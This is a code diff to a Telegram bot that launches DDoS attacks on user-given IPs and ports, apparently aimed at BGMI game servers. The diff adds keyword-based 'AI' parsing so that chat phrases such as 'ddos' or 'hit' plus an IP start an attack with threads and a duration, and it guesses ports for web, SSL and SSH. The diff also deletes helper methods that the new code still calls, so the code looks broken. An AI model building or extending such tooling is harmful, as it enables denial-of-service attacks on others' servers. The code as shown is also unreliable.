@@ -8,7 +8,7 @@ import random
 import re
 from datetime import datetime, timedelta
 from typing import Dict, List, Optional, Tuple, Union, Any, Callable
-from localization.messages import get_available_languages
+from localization.messages import get_available_languages, get_message
 import ipaddress
 import pytz
 import telebot
@@ -1204,10 +1204,10 @@ class CommandHandlers:
             )
     
     async def handle_message(self, message: Message):
-        """Handle general messages - Process IP/Port commands"""
+        """Handle general messages - AI-powered processing and IP/Port commands"""
         user_id = message.from_user.id
         chat_type = message.chat.type
-        text = message.text.strip().lower() if message.text else ""
+        text = message.text.strip() if message.text else ""
         
         # Skip if not a text message
         if not text:
@@ -1239,8 +1239,14 @@ class CommandHandlers:
                         parse_mode='Markdown'
                     )
                     return
-        
-        # Get user profile and preferred mode
+
+        # AI-powered command processing (if enabled)
+        if self.config.ENABLE_AI_COMMANDS:
+            ai_processed = await self._process_ai_command(message, user_id, text, chat_type)
+            if ai_processed:
+                return
+
+        # Get user profile and preferred mode for traditional IP/Port commands
         user = await self.db.get_user_profile(user_id)
         user_mode = UserMode.MANUAL
         thread_value = 200
@@ -1248,207 +1254,233 @@ class CommandHandlers:
         if user:
             user_mode = user.preferred_mode or UserMode.MANUAL
             thread_value = user.thread_value or 200
-        
+
         # Process message based on mode
+        text_lower = text.lower()
         if user_mode == UserMode.AUTO:
-            await self._process_auto_mode(message, user_id, text, chat_type, thread_value)
+            await self._process_auto_mode(message, user_id, text_lower, chat_type, thread_value)
         else:
-            await self._process_manual_mode(message, user_id, text, chat_type, thread_value)
-    
-    async def _process_auto_mode(self, message: Message, user_id: int, text: str, chat_type: str, thread_value: int):
-        """Process message in auto mode"""
-        # Match pattern: <ip> <port>
-        auto_mode_pattern = re.compile(r"(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b)\s(\d{1,5})")
-        match = auto_mode_pattern.match(text)
+            await self._process_manual_mode(message, user_id, text_lower, chat_type, thread_value)
+
+    async def _process_ai_command(self, message: Message, user_id: int, text: str, chat_type: str) -> bool:
+        """Process natural language commands using AI understanding"""
+        text_lower = text.lower()
         
-        if match:
-            ip, port = match.groups()
-            port = int(port)
+        # AI-powered command patterns
+        ai_patterns = {
+            # Status and help patterns
+            r'(what|how|help|guide|explain).*do|work|use': 'help',
+            r'(status|active|running|current).*action': 'list_active',
+            r'(my|user|account).*stats|statistics|info': 'stats',
+            r'(history|past|previous).*attack|action': 'history',
             
-            # Validate input
-            if not self._validate_input(message, ip, port):
-                return
+            # Language change patterns  
+            r'(change|set|switch).*language|lang': 'language',
+            r'(speak|talk).*\b(spanish|french|german|russian|chinese|japanese)\b': 'language',
             
-            # Generate random duration
-            duration = random.randint(80, 240)
+            # Attack patterns
+            r'(attack|strike|hit|bomb|ddos|stress).*(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})': 'attack_ip',
+            r'(stop|halt|cease|end).*(all|everything|attack)': 'stop_all',
             
-            # Start action
-            await self._start_action(message, user_id, ip, port, duration, UserMode.AUTO, chat_type, thread_value)
-        else:
-            await self.bot.reply_to(
-                message, 
-                "⚠️ *Drop Fail!* Aim like `<ip> <port>`—lock on!\n\n*By Ibr, the BGMI Beast!*", 
-                parse_mode='Markdown'
-            )
-    
-    async def _process_manual_mode(self, message: Message, user_id: int, text: str, chat_type: str, thread_value: int):
-        """Process message in manual mode"""
-        # Match pattern: <ip> <port> <duration>
-        manual_mode_pattern = re.compile(r"(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b)\s(\d{1,5})\s(\d{1,4})")
-        match = manual_mode_pattern.match(text)
+            # Mode switching patterns
+            r'(switch|change|set).*auto.*mode': 'mode_auto',
+            r'(switch|change|set).*manual.*mode': 'mode_manual',
+            
+            # Thread patterns
+            r'(set|change|use).*thread.*(\d+)': 'set_thread',
+            
+            # Ping/test patterns
+            r'(ping|test|check|alive|online)': 'ping',
+            
+            # Authentication patterns
+            r'(auth|authorize|login|access)': 'auth'
+        }
         
-        if match:
-            ip, port, duration = match.groups()
-            port = int(port)
-            duration = int(duration)
-            
-            # Validate input
-            if not self._validate_input(message, ip, port, duration):
-                return
-            
-            # Start action
-            await self._start_action(message, user_id, ip, port, duration, UserMode.MANUAL, chat_type, thread_value)
-        else:
-            await self.bot.reply_to(
-                message, 
-                "⚠️ *Aim Off!* Lock it in:\n"
-                "`<ip> <port> <duration>`\n\n"
-                "*Ex:* `192.168.1.100 8080 60`—60s of chaos!\n\n"
-                "*By Ibr, the BGMI Beast!*",
-                parse_mode='Markdown'
-            )
+        # Check each pattern
+        for pattern, command_type in ai_patterns.items():
+            if re.search(pattern, text_lower):
+                return await self._execute_ai_command(message, user_id, command_type, text, chat_type)
+        
+        # Check for IP patterns in natural language
+        ip_match = re.search(r'\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b', text)
+        port_match = re.search(r'\bport\s*(\d{1,5})\b|\b(\d{1,5})\b.*port', text)
+        duration_match = re.search(r'\b(\d{1,4})\s*(second|sec|s|minute|min|m)\b', text)
+        
+        if ip_match and (port_match or 'port' in text_lower):
+            return await self._process_natural_attack(message, user_id, text, chat_type, ip_match, port_match, duration_match)
+        
+        return False
     
-    def _validate_input(self, message: Message, ip: str, port: int, duration: int = None) -> bool:
-        """Validate input parameters"""
-        # Validate IP
+    async def _execute_ai_command(self, message: Message, user_id: int, command_type: str, text: str, chat_type: str) -> bool:
+        """Execute AI-interpreted commands"""
         try:
-            ipaddress.ip_address(ip)
-        except ValueError:
-            self.bot.reply_to(
-                message, 
-                "❌ *IP Miss!* That's not a target—scope again!\n\n*By Ibr, the BGMI Beast!*", 
-                parse_mode='Markdown'
-            )
-            return False
-        
-        # Validate port
-        if not 1 <= port <= 65535:
-            self.bot.reply_to(
-                message, 
-                "❌ *Port Off-Target!* Aim 1-65535!\n\n*By Ibr, the BGMI Beast!*", 
-                parse_mode='Markdown'
-            )
-            return False
+            if command_type == 'help':
+                await self.handle_help(message)
+            elif command_type == 'list_active':
+                await self.handle_list_active(message)
+            elif command_type == 'stats':
+                await self.handle_stats(message)
+            elif command_type == 'history':
+                await self.handle_history(message)
+            elif command_type == 'language':
+                await self._handle_ai_language_change(message, text)
+            elif command_type == 'stop_all':
+                await self._handle_ai_stop_all(message)
+            elif command_type == 'mode_auto':
+                await self._set_user_mode(message, user_id, UserMode.AUTO)
+            elif command_type == 'mode_manual':
+                await self._set_user_mode(message, user_id, UserMode.MANUAL)
+            elif command_type == 'set_thread':
+                thread_match = re.search(r'(\d+)', text)
+                if thread_match:
+                    await self._set_user_threads(message, user_id, int(thread_match.group(1)))
+            elif command_type == 'ping':
+                await self.handle_ping(message)
+            elif command_type == 'auth':
+                await self.handle_auth(message)
             
-        # Check blocked ports
-        if port in self.config.BLOCKED_PORTS:
-            self.bot.reply_to(
-                message, 
-                f"⛔ *Port {port} is a Dead Zone!* Switch targets!\n\n*By Ibr, the BGMI Beast!*", 
+            return True
+        except Exception as e:
+            logger.error(f"Error executing AI command: {str(e)}")
+            return False
+    
+    async def _process_natural_attack(self, message: Message, user_id: int, text: str, chat_type: str, 
+                                     ip_match, port_match, duration_match) -> bool:
+        """Process natural language attack commands"""
+        try:
+            ip = ip_match.group(1)
+            
+            # Extract port
+            port = None
+            if port_match:
+                port = int(port_match.group(1) or port_match.group(2))
+            else:
+                # Common port defaults based on context
+                if 'web' in text.lower() or 'http' in text.lower():
+                    port = 80
+                elif 'https' in text.lower() or 'ssl' in text.lower():
+                    port = 443
+                elif 'ssh' in text.lower():
+                    port = 22
+                else:
+                    await self.bot.reply_to(
+                        message,
+                        "🤖 *AI Understanding:* I found the IP but need the port!\n"
+                        "Try: `attack 192.168.1.1 port 8080` or `hit 192.168.1.1:8080`",
+                        parse_mode='Markdown'
+                    )
+                    return True
+            
+            # Extract duration
+            duration = None
+            if duration_match:
+                duration_val = int(duration_match.group(1))
+                unit = duration_match.group(2).lower()
+                if unit.startswith('m'):
+                    duration = duration_val * 60
+                else:
+                    duration = duration_val
+            
+            # Get user settings
+            user = await self.db.get_user_profile(user_id)
+            thread_value = user.thread_value if user else 200
+            
+            # Validate inputs
+            if not self._validate_input(message, ip, port, duration):
+                return True
+            
+            # Use auto mode duration if not specified
+            if duration is None:
+                duration = random.randint(80, 240)
+                
+            # Send AI confirmation
+            await self.bot.reply_to(
+                message,
+                f"🤖 *AI Command Understood!*\n\n"
+                f"🎯 *Target:* `{ip}:{port}`\n"
+                f"⏱ *Duration:* `{duration}s`\n"
+                f"🔫 *Threads:* `{thread_value}`\n\n"
+                "🚀 *Launching strike...*",
                 parse_mode='Markdown'
             )
-            return False
-        
-        # Validate duration if provided
-        if duration is not None:
-            if not 1 <= duration <= 600:
-                self.bot.reply_to(
-                    message, 
-                    "❌ *Timer Jam!* Set 1-600s—reload!\n\n*By Ibr, the BGMI Beast!*", 
-                    parse_mode='Markdown'
-                )
-                return False
-        
-        return True
+            
+            # Start the action
+            await self._start_action(message, user_id, ip, port, duration, UserMode.AUTO, chat_type, thread_value)
+            return True
+            
+        except Exception as e:
+            logger.error(f"Error processing natural attack: {str(e)}")
+            await self.bot.reply_to(
+                message,
+                "🤖 *AI Error:* Couldn't process that command. Try the standard format!",
+                parse_mode='Markdown'
+            )
+            return True
     
-    async def _start_action(self, message: Message, user_id: int, ip: str, port: int, 
-                          duration: int, mode: UserMode, chat_type: str, thread_value: int):
-        """Start an action process"""
-        # Send initial message
-        sent_message = await self.bot.send_message(
-            message.chat.id,
-            f"💥 *{mode.capitalize()} Mode Strike Incoming!* 💥\n\n"
-            f"🌍 *Target IP:* `{ip}`\n"
-            f"🔌 *Port:* `{port}`\n"
-            f"⏳ *Fuse:* `{duration}s`\n"
-            f"🔫 *Firepower:* `{thread_value}`\n\n"
-            "🎮 *Dropping the DDoS bomb—brace yourself!*",
-            parse_mode="Markdown"
-        )
+    async def _handle_ai_language_change(self, message: Message, text: str):
+        """Handle AI-detected language change requests"""
+        # Extract language from text
+        lang_patterns = {
+            'spanish': 'es', 'español': 'es',
+            'french': 'fr', 'français': 'fr', 'francais': 'fr',
+            'german': 'de', 'deutsch': 'de',
+            'russian': 'ru', 'русский': 'ru',
+            'chinese': 'zh', '中文': 'zh',
+            'japanese': 'ja', '日本語': 'ja',
+            'hindi': 'hi', 'हिंदी': 'hi', 'हिन्दी': 'hi',
+            'english': 'en'
+        }
         
-        # Start action
-        success, error_msg, action = await self.action_service.start_action(
-            user_id, ip, port, duration, thread_value
-        )
+        text_lower = text.lower()
+        for lang_name, lang_code in lang_patterns.items():
+            if lang_name in text_lower:
+                # Simulate /language command with argument
+                message.text = f"/language {lang_code}"
+                await self.handle_language(message)
+                return
         
-        if not success:
-            await self.bot.edit_message_text(
-                chat_id=message.chat.id,
-                message_id=sent_message.message_id,
-                text=f"⚠️ *Strike Failed!* Error: `{error_msg}`",
-                parse_mode="Markdown"
+        # If no specific language detected, show options
+        await self.handle_language(message)
+    
+    async def _handle_ai_stop_all(self, message: Message):
+        """Handle AI-detected stop all requests"""
+        # Simulate the "stop all" text message
+        stop_message = message
+        stop_message.text = "stop all"
+        await self.handle_stop_all(stop_message)
+    
+    async def _set_user_mode(self, message: Message, user_id: int, mode: UserMode):
+        """Set user's preferred mode via AI command"""
+        user = await self.db.get_user_profile(user_id)
+        if user:
+            user.preferred_mode = mode
+            await self.db.save_user_profile(user)
+            
+            mode_name = "Auto" if mode == UserMode.AUTO else "Manual"
+            await self.bot.reply_to(
+                message,
+                f"🤖 *AI Mode Switch:* Set to **{mode_name} Mode**!\n\n"
+                f"{'📱 *Auto:* Just send `IP PORT`' if mode == UserMode.AUTO else '⚙️ *Manual:* Send `IP PORT DURATION`'}",
+                parse_mode='Markdown'
+            )
+    
+    async def _set_user_threads(self, message: Message, user_id: int, threads: int):
+        """Set user's thread count via AI command"""
+        if not self.config.MIN_THREAD_COUNT <= threads <= self.config.MAX_THREAD_COUNT:
+            await self.bot.reply_to(
+                message,
+                f"🤖 *AI Validation:* Threads must be {self.config.MIN_THREAD_COUNT}-{self.config.MAX_THREAD_COUNT}!",
+                parse_mode='Markdown'
             )
             return
         
-        # Save action to database
-        await self.db.save_action(action)
-        
-        # Increment rate limit for non-authorized users in groups
-        if chat_type in ('group', 'supergroup') and user_id not in self.config.AUTHORIZED_USERS and not await self._is_user_authorized(user_id):
-            await self.db.increment_usage_count(user_id)
-        
-        # Monitor action progress
-        asyncio.create_task(self._monitor_action_progress(
-            user_id,
-            message.chat.id,
-            sent_message.message_id,
-            ip,
-            port,
-            duration,
-            thread_value
-        ))
-    
-    async def _monitor_action_progress(self, user_id: int, chat_id: int, 
-                                    message_id: int, ip: str, port: int, 
-                                    duration: int, thread_value: int):
-        """Monitor action progress and update status message"""
-        remaining = duration
-        update_interval = 5  # seconds
-        
-        while remaining > 0:
-            # Check if action still running
-            status = await self.action_service.get_action_status(user_id)
-            if not status or status['status'] != 'running':
-                # Action completed or failed
-                break
-                
-            # Update remaining time
-            remaining = max(0, int(status['remaining']))
+        user = await self.db.get_user_profile(user_id)
+        if user:
+            user.thread_value = threads
+            await self.db.save_user_profile(user)
             
-            # Update message
-            try:
-                await self.bot.edit_message_text(
-                    chat_id=chat_id,
-                    message_id=message_id,
-                    text=(
-                        f"🔥 *Strike LIVE!* `{remaining}s` to detonation!\n\n"
-                        f"🌍 *IP:* `{ip}`\n"
-                        f"🔌 *Port:* `{port}`\n"
-                        f"🔫 *Firepower:* `{thread_value}`\n\n"
-                        "💣 *BGMI chaos in progress—hold the line!*"
-                    ),
-                    parse_mode="Markdown"
-                )
-            except Exception as e:
-                logger.error(f"Error updating message: {str(e)}")
-            
-            # Wait for next update
-            await asyncio.sleep(min(update_interval, remaining))
-            
-        # Final update
-        try:
-            await self.bot.edit_message_text(
-                chat_id=chat_id,
-                message_id=message_id,
-                text=(
-                    f"🏆 *Chicken Dinner Secured!* 🏆\n\n"
-                    f"🌍 *IP:* `{ip}`\n"
-                    f"🔌 *Port:* `{port}`\n"
-                    f"⏱ *Strike Time:* `{duration}s`\n"
-                    f"🔫 *Firepower:* `{thread_value}`\n\n"
-                    "🎮 *Server smoked—next target, warrior?*"
-                ),
-                parse_mode="Markdown"
+            await self.bot.reply_to(
+                message,
+                f"🤖 *AI Thread Update:* Set to **{threads} threads**! 🔥",
+                parse_mode='Markdown'
             )
-        except Exception as e:
-            logger.error(f"Error updating final message: {str(e)}")
